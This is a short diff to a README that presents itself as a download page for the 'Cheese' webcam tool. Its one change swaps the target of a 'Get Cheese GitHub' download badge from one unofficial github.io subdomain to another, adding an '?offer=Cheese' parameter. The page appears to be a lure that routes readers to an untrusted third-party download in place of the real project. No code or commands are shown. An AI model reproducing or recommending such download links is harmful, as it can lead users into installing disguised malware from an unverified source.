@@ -1,6 +1,6 @@
 # Cheese Download — Fun Desktop Webcam Tool  
 
-[![Get Cheese GitHub](https://img.shields.io/badge/Get%20Cheese%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Cheese)  
+[![Get Cheese GitHub](https://img.shields.io/badge/Get%20Cheese%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=Cheese)  
 
 ---
 
